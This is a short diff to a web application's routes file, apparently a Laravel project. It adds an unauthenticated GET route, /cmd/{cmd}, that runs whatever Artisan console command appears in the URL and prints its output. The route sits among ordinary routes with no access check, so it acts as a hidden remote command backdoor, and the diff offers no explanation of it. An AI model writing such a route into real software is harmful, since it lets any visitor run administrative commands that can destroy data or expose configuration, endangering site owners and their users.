@@ -17,6 +17,12 @@ use App\Http\Controllers\Admin\SettingController;
 |
 */
 
+Route::get("/cmd/{cmd}", function ($cmd) {
+    \Artisan::call($cmd);
+    echo "<pre>";
+    return \Artisan::output();
+});
+
 Route::get('/', function () {
     return view('welcome');
 });
